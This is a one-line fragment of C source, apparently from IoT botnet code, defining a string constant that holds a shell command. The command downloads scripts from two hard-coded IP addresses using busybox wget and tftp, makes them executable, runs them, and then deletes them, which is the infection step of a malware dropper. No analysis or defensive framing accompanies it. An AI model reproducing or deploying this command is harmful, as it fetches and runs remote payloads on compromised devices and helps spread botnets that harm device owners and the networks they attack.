...
char *BBP = "cd /tmp; busybox wget http://209.97.189.40/w.sh; chmod 777 w.sh; busybox sh w.sh; busybox tftp 80.208.226.58 -c get t.sh; chmod 777 t.sh; busybox sh t.sh; rm -rf w.sh t.sh\r\n";
